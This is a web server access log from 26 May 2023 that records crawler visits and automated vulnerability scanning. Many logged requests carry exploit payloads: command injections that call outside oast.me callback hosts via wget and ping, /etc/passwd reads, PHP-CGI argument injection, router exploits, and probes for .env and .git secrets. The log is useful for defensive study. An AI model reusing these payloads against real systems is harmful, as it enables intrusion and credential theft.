::ffff:124.156.223.97 - - [26/May/2023:00:00:40 +0000] "GET / HTTP/1.1" 200 57394 "-" "'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0'"
::ffff:185.94.29.195 - - [26/May/2023:08:34:02 +0000] "GET /admin/user.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:08:34:22 +0000] "GET /manage/webshell/u?_=5621298674064&h=15&k=%73%65%72%76%69%63%65%0a%73%73%68%0a%64%69%73%61%62%6c%65%0a&l=62&s=5&w=218 HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:08:34:25 +0000] "GET /manage/webshell/u?_=5621298674064&h=15&k=%0a&l=62&s=5&w=218 HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:08:34:39 +0000] "POST /ajaxPages/writeBrowseFilePathAjax.php HTTP/1.1" 404 177 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:08:34:43 +0000] "GET /2QIK3sw9HmFr8wLjQc2zjYLnEG8.php?cmd=sudo%20rpm%20--eval%20'%25%7Blua:os.execute(%22wget%20http://chnpjh7t51ik3aht4hh0f4szjgaso833f.oast.me%22)%7D' HTTP/1.1" 404 170 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:08:36:39 +0000] "POST /cgi?2 HTTP/1.1" 404 143 "http://34.212.47.6/mainFrame.htm" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:08:36:43 +0000] "POST /cgi?7 HTTP/1.1" 404 143 "http://34.212.47.6/mainFrame.htm" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:08:45:52 +0000] "GET /server/ HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:08:49:52 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 404 163 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:08:49:55 +0000] "PUT /v1/agent/service/register HTTP/1.1" 404 164 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:08:52:05 +0000] "GET /openam/oauth2/..;/ccversion/Version HTTP/1.1" 404 174 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:08:52:21 +0000] "POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:08:54:41 +0000] "POST /javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1" 404 192 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:08:54:43 +0000] "POST /auth/newpassword HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:08:55:46 +0000] "POST /html/setup.html HTTP/1.1" 404 155 "-" "Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
::ffff:135.125.217.54 - - [26/May/2023:08:58:15 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [26/May/2023:08:58:15 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:173.252.87.118 - - [26/May/2023:09:03:23 +0000] "HEAD / HTTP/1.1" 200 57394 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:173.252.87.22 - - [26/May/2023:09:03:23 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:173.252.87.14 - - [26/May/2023:09:03:24 +0000] "GET / HTTP/1.1" 200 57394 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:173.252.87.118 - - [26/May/2023:09:03:24 +0000] "GET /contact HTTP/1.1" 200 10017 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:20.199.9.220 - - [26/May/2023:09:09:43 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:20.199.9.220 - - [26/May/2023:09:09:44 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:20.199.9.220 - - [26/May/2023:09:09:44 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:20.199.9.220 - - [26/May/2023:09:09:45 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:65.49.20.67 - - [26/May/2023:09:18:49 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0 (Edition Yx GX)"
::ffff:194.38.21.214 - - [26/May/2023:09:18:54 +0000] "GET /modules/mod_impact/elements/upload_file.php HTTP/1.1" 404 182 "-" "ALittle Client"
::ffff:51.222.253.13 - - [26/May/2023:09:22:57 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:65.49.20.67 - - [26/May/2023:09:26:48 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:65.49.20.67 - - [26/May/2023:09:28:17 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0 (Edition Yx GX)"
::ffff:65.49.20.67 - - [26/May/2023:09:30:04 +0000] "GET /api/v2/static/not.found HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0 (Edition Yx GX)"
::ffff:65.49.20.67 - - [26/May/2023:09:31:08 +0000] "GET /geoserver/web/ HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:95.214.27.80 - - [26/May/2023:09:32:00 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "python-requests/2.28.1"
::ffff:185.94.29.195 - - [26/May/2023:09:32:19 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 158 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F"
::ffff:185.94.29.195 - - [26/May/2023:09:32:23 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 158 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36"
::ffff:66.249.65.185 - - [26/May/2023:09:32:48 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.126 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:104.152.52.206 - - [26/May/2023:09:42:02 +0000] "GET / HTTP/1.0" 200 57394 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
::ffff:45.79.171.66 - - [26/May/2023:09:43:02 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:43.155.118.219 - - [26/May/2023:09:44:59 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:45.79.171.66 - - [26/May/2023:09:57:31 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:120.211.85.173 - - [26/May/2023:09:58:38 +0000] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 162 "-" "-"
::ffff:45.56.108.128 - - [26/May/2023:10:02:37 +0000] "GET /systembc/password.php HTTP/1.0" 404 160 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:10:02:54 +0000] "GET /card_scan.php?No=30&ReaderNo=%60cat%20/etc/passwd%20%3E%20nuclei.txt%60 HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:10:02:57 +0000] "GET /nuclei.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:10:11:48 +0000] "POST /index.php/bbs/index/download?local=1&name=1.txt&url=/etc/passwd HTTP/1.1" 404 168 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
::ffff:165.22.60.26 - - [26/May/2023:10:11:49 +0000] "GET /Temporary_Listen_Addresses HTTP/1.1" 404 165 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:185.94.29.195 - - [26/May/2023:10:23:33 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36"
::ffff:34.140.248.32 - - [26/May/2023:10:24:15 +0000] "GET / HTTP/1.1" 200 57394 "-" "python-requests/2.28.2"
::ffff:141.95.74.78 - - [26/May/2023:10:25:00 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:14.29.223.121 - - [26/May/2023:10:25:00 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
::ffff:141.95.74.78 - - [26/May/2023:10:25:01 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.191.171.17 - - [26/May/2023:10:34:44 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:185.191.171.34 - - [26/May/2023:10:34:44 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:154.209.125.71 - - [26/May/2023:10:37:14 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
::ffff:45.79.171.66 - - [26/May/2023:10:38:21 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:185.94.29.195 - - [26/May/2023:10:43:36 +0000] "POST /goform/setmac HTTP/1.1" 404 153 "http://34.212.47.6/index.htmlr" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
::ffff:185.94.29.195 - - [26/May/2023:10:47:09 +0000] "GET /api/system/deviceinfo HTTP/1.1" 404 160 "https://34.212.47.6" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:10:48:49 +0000] "GET /seeyon/thirdpartyController.do.css/..;/ajax.do HTTP/1.1" 404 185 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:10:48:57 +0000] "POST /api/login HTTP/1.1" 404 149 "https://34.212.47.6/manage/account/login?redirect=%2Fmanage" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:10:50:19 +0000] "GET /cgi-bin/admin.cgi?Cmd=ping${IFS}-c${IFS}1${IFS}chnpjh7t51ik3aht4hh04wewrcx9tjs8h.oast.me&Command=sysCommand HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:10:50:24 +0000] "GET /html/log HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:10:50:32 +0000] "POST /upload HTTP/1.1" 404 146 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:10:50:42 +0000] "POST /mailingupgrade.php HTTP/1.1" 404 158 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:10:53:12 +0000] "GET /lab.html?vpath=//interact.sh HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36"
::ffff:45.79.171.66 - - [26/May/2023:10:57:07 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:139.144.150.26 - - [26/May/2023:10:58:11 +0000] "GET / HTTP/1.1" - - "-" "-"
::ffff:139.144.150.26 - - [26/May/2023:10:58:11 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA34448) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.5843.98 Mobile Safari/537.3"
::ffff:139.144.150.26 - - [26/May/2023:10:58:11 +0000] "GET /.vscode/sftp.json HTTP/1.1" 404 156 "-" "Go-http-client/1.1"
::ffff:139.144.150.26 - - [26/May/2023:10:58:12 +0000] "GET /about HTTP/1.1" 404 144 "-" "Go-http-client/1.1"
::ffff:139.144.150.26 - - [26/May/2023:10:58:12 +0000] "GET /debug/default/view?panel=config HTTP/1.1" 404 157 "-" "Go-http-client/1.1"
::ffff:139.144.150.26 - - [26/May/2023:10:58:12 +0000] "GET /v2/_catalog HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
::ffff:139.144.150.26 - - [26/May/2023:10:58:12 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 214 "-" "Go-http-client/1.1"
::ffff:139.144.150.26 - - [26/May/2023:10:58:13 +0000] "GET /server-status HTTP/1.1" 404 152 "-" "Go-http-client/1.1"
::ffff:139.144.150.26 - - [26/May/2023:10:58:13 +0000] "GET /login.action HTTP/1.1" 404 151 "-" "Go-http-client/1.1"
::ffff:139.144.150.26 - - [26/May/2023:10:58:13 +0000] "GET /_all_dbs HTTP/1.1" 404 147 "-" "Mozilla/5.0 (l9scan/2.0.63e27343e2231323e24333; +https://leakix.net)"
::ffff:139.144.150.26 - - [26/May/2023:10:58:14 +0000] "GET /.DS_Store HTTP/1.1" 404 148 "-" "Go-http-client/1.1"
::ffff:139.144.150.26 - - [26/May/2023:10:58:14 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Go-http-client/1.1"
::ffff:139.144.150.26 - - [26/May/2023:10:58:14 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
::ffff:139.144.150.26 - - [26/May/2023:10:58:15 +0000] "GET /s/63e27343e2231323e24333/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1" 404 233 "-" "Go-http-client/1.1"
::ffff:139.144.150.26 - - [26/May/2023:10:58:15 +0000] "GET /config.json HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
::ffff:139.144.150.26 - - [26/May/2023:10:58:15 +0000] "GET /telescope/requests HTTP/1.1" 404 157 "-" "Go-http-client/1.1"
::ffff:139.144.150.26 - - [26/May/2023:10:58:16 +0000] "GET /?rest_route=/wp/v2/users/ HTTP/1.1" 200 57394 "-" "Go-http-client/1.1"
::ffff:66.249.66.83 - - [26/May/2023:11:02:48 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:43.155.118.219 - - [26/May/2023:11:04:38 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:128.199.77.96 - - [26/May/2023:11:08:32 +0000] "GET / HTTP/1.0" 200 57394 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0"
::ffff:45.79.171.66 - - [26/May/2023:11:08:59 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:17.241.75.142 - - [26/May/2023:11:13:34 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)"
::ffff:17.241.75.142 - - [26/May/2023:11:13:34 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)"
::ffff:52.167.144.59 - - [26/May/2023:11:18:17 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:52.167.144.85 - - [26/May/2023:11:18:20 +0000] "GET /books.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:3.83.81.195 - - [26/May/2023:11:28:13 +0000] "GET / HTTP/1.1" 200 57394 "-" "curl/7.81.0"
::ffff:45.79.171.66 - - [26/May/2023:11:29:18 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:185.191.171.5 - - [26/May/2023:11:35:04 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:185.191.171.8 - - [26/May/2023:11:35:05 +0000] "GET /contact?s=1&ss=7 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:45.79.171.66 - - [26/May/2023:11:43:47 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:185.254.196.173 - - [26/May/2023:11:44:10 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.173 - - [26/May/2023:11:44:14 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:11:48:55 +0000] "GET /plugin HTTP/1.1" 404 145 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36"
::ffff:185.191.171.3 - - [26/May/2023:11:50:36 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:185.191.171.24 - - [26/May/2023:11:50:37 +0000] "GET /joinemail?type=blackbeltclasses HTTP/1.1" 200 8998 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:185.94.29.195 - - [26/May/2023:11:50:53 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:11:56:16 +0000] "GET /admin/elfinder/elfinder-cke.html HTTP/1.1" 404 171 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:11:56:20 +0000] "GET /assets/backend/elfinder/elfinder-cke.html HTTP/1.1" 404 180 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:11:56:24 +0000] "GET /assets/elFinder-2.1.9/elfinder.html HTTP/1.1" 404 174 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:11:56:28 +0000] "GET /assets/elFinder/elfinder.html HTTP/1.1" 404 168 "-" "Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:11:56:32 +0000] "GET /backend/elfinder/elfinder-cke.html HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:11:56:36 +0000] "GET /elfinder/elfinder-cke.html HTTP/1.1" 404 165 "-" "Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:11:56:40 +0000] "GET /uploads/assets/backend/elfinder/elfinder-cke.html HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:11:56:44 +0000] "GET /uploads/assets/backend/elfinder/elfinder.html HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:11:56:48 +0000] "GET /uploads/elfinder/elfinder-cke.html HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36"
::ffff:185.94.29.195 - - [26/May/2023:12:09:09 +0000] "POST /seeyon/main.do?method=changeLocale HTTP/1.1" 404 154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:114.119.139.251 - - [26/May/2023:12:10:23 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
